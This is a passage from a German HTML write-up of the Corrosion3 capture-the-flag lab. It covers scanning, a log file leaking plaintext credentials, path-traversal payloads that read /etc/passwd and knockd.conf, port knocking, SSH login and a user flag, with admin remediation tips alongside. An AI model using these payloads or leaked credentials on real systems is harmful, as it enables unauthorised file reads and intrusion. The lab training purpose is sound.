@@ -1,0 +1,817 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Corrosion3 - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Corrosion3 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">knockd</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nano (implied)</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">python -c 'import pty...'</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">dmesg</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">runc</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & LFI</a></li>
+                <li><a href="#initial-access">Initial Access (randy via SSH & Port Knocking)</a></li>
+                <li><a href="#privilege-escalation-randy-bob">Privilege Escalation (randy -> bob via Cronjob)</a></li>
+                <li><a href="#privilege-escalation-bob-root">Privilege Escalation (bob -> root via runc)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.116	08:00:27:87:77:3f	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der initiale ARP-Scan identifiziert einen Host mit der IP-Adresse <code>192.168.2.116</code> im lokalen Netzwerk. Die MAC-Adresse weist auf eine Oracle VirtualBox-VM hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Einen detaillierten Nmap-Scan auf die Ziel-IP durchführen.<br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkaktivität.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.116 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 23:29 CEST
+Nmap scan report for corrosion (192.168.2.116)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">22/tcp filtered ssh</span>
+<span class="command">80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 08:00:27:87:77:3F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms corrosion (192.168.2.116)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (-sS, -sC, -T5, -AO, -p-) wird auf das Ziel durchgeführt. Es werden zwei Ports gefunden:
+                <ul>
+                    <li>Port <code>22</code> (SSH): Wird als `filtered` gemeldet. Das bedeutet, Nmap konnte nicht definitiv feststellen, ob der Port offen oder geschlossen ist, oft deutet dies auf eine Firewall hin, die SYN-Pakete verwirft oder blockiert.</li>
+                    <li>Port <code>80</code> (HTTP): Offen, läuft Apache httpd 2.4.41 (Ubuntu) mit der Standardseite ("It works").</li>
+                </ul>
+                Das Betriebssystem wird als Linux identifiziert.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Webserver auf Port 80 ist der einzige direkt zugängliche Dienst. Der gefilterte SSH-Port ist ungewöhnlich und deutet auf einen Schutzmechanismus wie eine Firewall oder Port Knocking hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Webserver auf Port 80 untersuchen. Nach Hinweisen suchen, wie der SSH-Port geöffnet werden kann (z.B. durch Analyse von Web-Inhalten oder Konfigurationsdateien).<br><strong>Empfehlung (Admin):</strong> Standard-Apache-Seite ersetzen. Firewall-Regeln überprüfen. Wenn Port Knocking verwendet wird, sicherstellen, dass die Konfiguration sicher ist (obwohl es generell als Security through Obscurity gilt).</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration & LFI</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.116</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
++ Start Time:         2023-04-25 23:30:42 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: ...
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> See: ...
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">Apache/2.4.41 appears to be outdated</span> (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: <span class="password">Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5d6d20e002cdc, mtime: gzip.</span> See: CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ <span class="command">/website/: This might be interesting.</span>
++ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2023-04-25 23:30:51 (GMT2) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nikto scannt den Webserver auf Port 80. Es meldet fehlende Sicherheitsheader, eine veraltete Apache-Version (2.4.41), ein mögliches Inode-Leak über ETags und findet ein interessantes Verzeichnis `/website/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fehlende Header und ETag-Leak sind geringfügig. Die veraltete Apache-Version könnte relevant sein, falls bekannte Exploits existieren. Das Verzeichnis `/website/` ist das primäre Ziel für weitere Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis `/website/` mit Tools wie Gobuster untersuchen. Nach bekannten Schwachstellen für Apache 2.4.41 suchen.<br><strong>Empfehlung (Admin):</strong> Apache aktualisieren. Sicherheitsheader hinzufügen. ETag-Konfiguration überprüfen (`FileETag None`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.116 -x txt,php,[...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+<span class="command">http://192.168.2.116/index.html</span>           (Status: 200) [Size: 10918]
+<span class="command">http://192.168.2.116/website</span>              (Status: 301) [Size: 316] [--> http://192.168.2.116/website/]
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Implied second gobuster run on /website/ -->
+                    <pre>
+<span class="command">http://192.168.2.116/website/index.html</span>           (Status: 200) [Size: 52549]
+<span class="command">http://192.168.2.116/website/assets</span>               (Status: 301) [Size: 323] [--> http://192.168.2.116/website/assets/]
+<span class="command">http://192.168.2.116/website/logs</span>                 (Status: 301) [Size: 321] [--> http://192.168.2.116/website/logs/]
+<span class="command">http://192.168.2.116/website/License.txt</span>          (Status: 200) [Size: 1989]
+<span class="command">http://192.168.2.116/website/sales_detail.php</span>     (Status: 200) [Size: 0]
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Implied third gobuster run on /website/assets/ -->
+                    <pre>
+<span class="command">http://192.168.2.116/website/assets/images</span>               (Status: 301) [Size: 330] [--> http://192.168.2.116/website/assets/images/]
+<span class="command">http://192.168.2.116/website/assets/css</span>                  (Status: 301) [Size: 327] [--> http://192.168.2.116/website/assets/css/]
+<span class="command">http://192.168.2.116/website/assets/js</span>                   (Status: 301) [Size: 326] [--> http://192.168.2.116/website/assets/js/]
+<span class="command">http://192.168.2.116/website/assets/fonts</span>                (Status: 301) [Size: 329] [--> http://192.168.2.116/website/assets/fonts/]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mehrere Gobuster-Scans werden durchgeführt, beginnend beim Webroot und dann tiefer in die gefundenen Verzeichnisse (`/website/`, `/website/assets/`). Wichtige Funde sind:
+                <ul>
+                    <li>`/website/`: Das Hauptverzeichnis der eigentlichen Webanwendung.</li>
+                    <li>`/website/logs/`: Ein potenziell sehr interessantes Verzeichnis für Logdateien.</li>
+                    <li>`/website/sales_detail.php`: Eine PHP-Datei, die auf spezifische Funktionalität hindeutet.</li>
+                    <li>Standard-Asset-Verzeichnisse unter `/website/assets/`.</li>
+                </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis `/website/logs/` und die Datei `/website/sales_detail.php` sind die vielversprechendsten Funde und sollten zuerst untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis `/website/logs/` im Browser aufrufen und prüfen, ob es zugänglich ist und Logdateien enthält. Die Datei `/website/sales_detail.php` auf Parameter und Schwachstellen (insbesondere LFI/RFI) prüfen.<br><strong>Empfehlung (Admin):</strong> Zugriff auf Log-Verzeichnisse über das Web einschränken. PHP-Skripte auf Schwachstellen prüfen.</p>
+
+            <p class="analysis"><strong>Analyse (Logfile Leak):</strong> Das Verzeichnis `/website/logs` wird im Browser aufgerufen. Es ist zugänglich und enthält Logdateien. In den Logdateien werden HTTP-POST-Anfragen gefunden, die Klartext-Anmeldedaten enthalten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Inhalt aus Logdatei (Manuelle Notiz) -->
+                    <pre>
+POST /login/ HTTP/1.1
+Host: localhost
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+user=<span class="command">randy</span>&pass=<span class="password">RaNDY$SuPer!Secr3etPa$$word</span>
+---
+POST /login/ HTTP/1.1
+Host: localhost
+[...]
+user=test&pass=test
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Klartext-Anmeldedaten (`randy:RaNDY$SuPer!Secr3etPa$$word`) wurden in öffentlich zugänglichen Logdateien gefunden. Dies ist eine schwerwiegende Sicherheitslücke.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Anmeldedaten für den SSH-Login verwenden (da Port 22 gefiltert war und möglicherweise durch Port Knocking geöffnet werden muss).<br><strong>Empfehlung (Admin):</strong> **Sofort beheben!** Niemals Passwörter im Klartext loggen. Zugriff auf Logdateien stark einschränken. Die Anwendung überarbeiten, um Passwort-Logging zu verhindern.</p>
+
+            <p class="analysis"><strong>Analyse (LFI):</strong> Es wird versucht, die Datei `/website/sales_detail.php` auf eine Local File Inclusion (LFI)-Schwachstelle zu testen, indem verschiedene Parameter gefuzzt werden.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.2.116/website/sales_detail.php?FUZZ=../../../../../../etc/passwd --hh 0</span></div>
+                    <pre>
+[...]
+Target: http://192.168.2.116/website/sales_detail.php?FUZZ=../../../../../../etc/passwd
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000521:   200        49 L     86 W       2885 Ch     "shared"</span>
+
+Total time: 15.05361
+Processed Requests: 2684
+Filtered Requests: 2683
+Requests/sec.: 178.2960
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `wfuzz`-Scan identifiziert den Parameter `shared` als potenziellen LFI-Vektor. Eine Anfrage mit `?shared=` liefert eine Antwort mit 2885 Zeichen, was sich von der Standardantwort (0 Zeichen, `--hh 0`) unterscheidet.</p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Manuelle Notiz/Browser-Aufruf -->
+                    <pre>http://192.168.2.116/website/sales_detail.php?shared=/etc/passwd</pre>
+                     <!-- Ausgabe der /etc/passwd -->
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[...]
+<span class="command">randy:x:1000:1000:randy,,,:/home/randy:/bin/bash</span>
+[...]
+<span class="command">bob:x:1001:1001:/home/bob:/bin/sh</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.116/website/sales_detail.php?shared=/etc/passwd | grep bash</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2885  100  2885    0     0  5004k      0 --:--:-- --:--:-- --:--:-- 2817k
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+<span class="password">randy:x:1000:1000:randy,,,:/home/randy:/bin/bash</span>
+                    </pre>
+                  </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Aufruf von `sales_detail.php?shared=/etc/passwd` zeigt erfolgreich den Inhalt der `/etc/passwd`-Datei an. Dies bestätigt die LFI-Schwachstelle. Die Ausgabe von `grep bash` hebt Benutzer mit einer Bash-Shell hervor (`root`, `randy`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritische LFI-Schwachstelle bestätigt!** Dies ermöglicht das Lesen beliebiger Dateien auf dem Server, auf die der Webserver-Benutzer (`www-data`) Zugriff hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die LFI nutzen, um weitere sensible Dateien zu lesen:
+                <ul>
+                    <li>Konfigurationsdateien (z.B. `/etc/apache2/apache2.conf`, `/var/www/html/website/config.php` falls vorhanden)</li>
+                    <li>SSH-Schlüssel (z.B. `/home/randy/.ssh/id_rsa`)</li>
+                    <li>Systemdateien (z.B. `/etc/shadow` - wahrscheinlich nicht lesbar für `www-data`, `/proc/self/environ`)</li>
+                    <li>**Konfigurationsdateien für Port Knocking (z.B. `/etc/knockd.conf`)**</li>
+                </ul>
+            <strong>Empfehlung (Admin):</strong> LFI-Schwachstelle **dringend beheben!** Eingaben validieren, Whitelisting für erlaubte Dateien/Pfade verwenden, `include()`/`require()` sicher nutzen, `open_basedir` in PHP konfigurieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u corrosion.hmv -H "Host: FUZZ.corrosion.hmv" --hh 10918</span></div>
+                    <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000009532:   400        10 L     35 W       316 Ch      "#www"
+000010581:   400        10 L     35 W       316 Ch      "#mail"
+000047706:   400        10 L     35 W       316 Ch      "#smtp"
+000103135:   400        10 L     35 W       316 Ch      "#pop3"
+[...]
+                    </pre>
+                  </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneuter Versuch, Subdomains/VHosts mittels `wfuzz` zu finden. Es werden nur ungültige Anfragen (Status 400) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine weiteren Subdomains auf diesem Weg gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf LFI und die gefundenen Credentials legen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (randy via SSH & Port Knocking)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Da der SSH-Port (22) gefiltert ist und eine LFI-Schwachstelle existiert, wird versucht, die Konfigurationsdatei des Port-Knocking-Dienstes (`knockd`) zu lesen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Manuelle Notiz/Browser-Aufruf -->
+                    <pre>Browser: http://192.168.2.116/website/sales_detail.php?shared=/etc/knockd.conf</pre>
+                     <!-- Inhalt der knockd.conf -->
+                    <pre>
+ [options]
+     UseSyslog
+
+ [<span class="command">openSSH</span>]
+     sequence = <span class="command">1110,2220,3330</span>
+     seq_timeout = 20
+     tcpflags = syn
+     command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+
+ [<span class="command">closeSSH</span>]
+     sequence = 3330,2220,1110
+     seq_timeout = 20
+     command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+     tcpflags = syn
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die LFI wird erfolgreich genutzt, um `/etc/knockd.conf` zu lesen. Die Konfiguration zeigt, dass eine Sequenz von SYN-Paketen auf die Ports 1110, 2220 und 3330 (innerhalb von 20 Sekunden) gesendet werden muss, damit eine `iptables`-Regel hinzugefügt wird, die den Zugriff auf Port 22 (SSH) von der IP des Klienten (`%IP%`) erlaubt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Mechanismus zum Öffnen des SSH-Ports wurde aufgedeckt. Dies erklärt, warum Port 22 initial als `filtered` erschien.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `knock`-Kommando (oder ein anderes Tool) verwenden, um die Port-Sequenz 1110, 2220, 3330 an das Ziel zu senden.<br><strong>Empfehlung (Admin):</strong> LFI beheben. Port Knocking überdenken; es bietet nur geringe Sicherheit und kann zu Verbindungsproblemen führen. Besser ist eine starke SSH-Authentifizierung und ggf. Firewall-Regeln, die nur bekannte IPs erlauben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">knock 192.168.2.116 1110 2220 3330</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `knock` wird verwendet, um die erforderliche Port-Sequenz an das Ziel zu senden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Port sollte nun für die IP des Angreifers offen sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit Nmap prüfen, ob Port 22 jetzt offen ist, und dann den SSH-Login versuchen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.116 -p22</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 23:59 CEST
+Nmap scan report for corrosion.hmv (192.168.2.116)
+Host is up (0.00012s latency).
+
+PORT   STATE <span class="password">SERVICE</span> VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey: ...
+MAC Address: 08:00:27:87:77:3F (Oracle VirtualBox virtual NIC)
+[...]
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms corrosion.hmv (192.168.2.116)
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan gezielt auf Port 22 bestätigt, dass dieser nun `open` ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Port Knocking war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nun den SSH-Login als `randy` mit dem in den Logs gefundenen Passwort versuchen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh randy@corrosion.hmv</span></div>
+                    <pre>
+The authenticity of host 'corrosion.hmv (192.168.2.116)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+[...]
+randy@corrosion.hmv's password: <span class="password">RaNDY$SuPer!Secr3etPa$$word</span>
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-28-generic x86_64)
+[...]
+<span class="password">randy@corrosion:~$</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als Benutzer `randy` mit dem Passwort `RaNDY$SuPer!Secr3etPa$$word` (aus den Web-Logs) ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Initialer Zugriff** als Benutzer `randy` wurde erlangt!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standard-Enumeration als `randy` durchführen (Rechte, SUID, Cronjobs, etc.).<br><strong>Empfehlung (Admin):</strong> Log-Leak beheben, schwaches/kompromittiertes Passwort ändern.</p>
+        </section>
+
+        <section id="privilege-escalation-randy-bob">
+            <h2>Privilege Escalation (randy -> bob via Cronjob)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `randy` wird die Umgebung untersucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 72
+drwxr-xr-x 15 randy randy 4096 Jan 31  2022 .
+drwxr-xr-x  4 root  root  4096 Jan 31  2022 ..
+lrwxrwxrwx  1 root  root     9 Jan 31  2022 .bash_history -> /dev/null
+[...]
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for randy: <span class="password">RaNDY$SuPer!Secr3etPa$$word</span>
+Sorry, user randy may not run sudo on corrosion.
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Auflistung des Home-Verzeichnisses und `sudo -l` zeigen keine offensichtlichen Eskalationspfade. Die Bash-History wird nach `/dev/null` geleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standard-Enumeration liefert keine direkten Hinweise. Es müssen andere Methoden gefunden werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Systemweite Suche nach SUID-Dateien, Capabilities, Cronjobs, ungewöhnlichen Prozessen oder Konfigurationsdateien.<br><strong>Empfehlung (Admin):</strong> Logging und Monitoring aktivieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+[...] (Viele Snap-Binaries)
+   530155    464 -rwsr-xr-x   1 root     root              473576 Dec  2  2021 /usr/lib/openssh/ssh-keysign
+   526458     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   525124     16 -rwsr-sr-x   1 root     root               14488 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
+   526776     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+   533334    128 -rwsr-xr-x   1 root     root              130408 Mar 26  2021 /usr/lib/snapd/snap-confine
+   524406     24 -rwsr-xr-x   1 root     root               22840 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+   535544    388 -rwsr-xr--   1 root     dip               395144 Jul 23  2020 /usr/sbin/pppd
+   524981     56 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /usr/bin/mount
+   524462     52 -rwsr-xr-x   1 root     root               53040 Jul 14  2021 /usr/bin/chsh
+   524456     84 -rwsr-xr-x   1 root     root               85064 Jul 14  2021 /usr/bin/chfn
+   525172     68 -rwsr-xr-x   1 root     root               68208 Jul 14  2021 /usr/bin/passwd
+   524984     40 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /usr/bin/umount
+   525102     44 -rwsr-xr-x   1 root     root               44784 Jul 14  2021 /usr/bin/newgrp
+   525447    164 -rwsr-xr-x   1 root     root              166056 Jan 19  2021 /usr/bin/sudo
+   549373     68 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /usr/bin/su
+   524724     88 -rwsr-xr-x   1 root     root               88464 Jul 14  2021 /usr/bin/gpasswd
+   548908     16 -rwsr-xr-x   1 root     root               14728 Oct 12  2021 /usr/bin/vmware-user-suid-wrapper
+   524646     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:~$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <!-- Keine Ausgabe im Original -->
+                  </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:~$ <span class="command">ss -atlnp</span></div>
+                    <pre>
+State                 Recv-Q                Local Address:Port       Peer Address:Port  Process
+LISTEN                0                     127.0.0.53%lo:53
+LISTEN                0                     0.0.0.0:22
+LISTEN                0                     127.0.0.1:631
+LISTEN                0                     *:80
+LISTEN                0                     [::]:22
+LISTEN                0                     [::]:631
+                    </pre> <!-- Vereinfachte Ausgabe -->
+                  </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Suche nach SUID-Binaries und Capabilities (`getcap`) ergibt keine ungewöhnlichen Funde. Die Netzwerk-Sockets (`ss`) zeigen nur die erwarteten Dienste.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standard-SUID/Capabilities/Netzwerk-Konfiguration. Keine offensichtlichen schnellen Eskalationspfade hier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Benutzerverzeichnisse, Cronjobs oder systemweite Konfigurationen untersuchen.<br><strong>Empfehlung (Admin):</strong> System härten, unnötige SUID-Binaries entfernen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:~$ <span class="command">ls /home/</span></div>
+                    <pre>
+bob  randy
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:~$ <span class="command">cd /home/bob/</span></div>
+                     <!-- Keine Ausgabe -->
+                  </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">randy@corrosion:/home/bob$ <span class="command">ls -la</span></div>
+                    <pre>
+drwxr-xr-x 5 bob  bob  4096 Feb  3  2022 .
+drwxr-xr-x 4 root root 4096 Jan 31  2022 ..
+lrwxrwxrwx 1 root root    9 Jan 31  2022 .bash_history -> /dev/null
+[...]
+-rw-rw-r-- 1 bob  bob    66 Jan 31  2022 <span class="command">.selected_editor</span>
+-rw-rw-r-- 1 bob  bob    33 Jan 31  2022 user.txt <!-- Lesbar für randy? -->
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:/home/bob$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">d3a6cef5b73fa1fb233ed6a0e3b9de01</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">randy@corrosion:/home/bob$ <span class="command">cat .selected_editor</span></div>
+                    <pre>
+# Generated by /usr/bin/select-editor
+SELECTED_EDITOR="/bin/nano"
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis von `bob` wird untersucht. Überraschenderweise scheint `randy` Leserechte auf `/home/bob` und die darin enthaltene `user.txt` zu haben (Berechtigungen `-rw-rw-r--`). Die Datei `.selected_editor` zeigt, dass `bob` `nano` als bevorzugten Editor verwendet.</p>
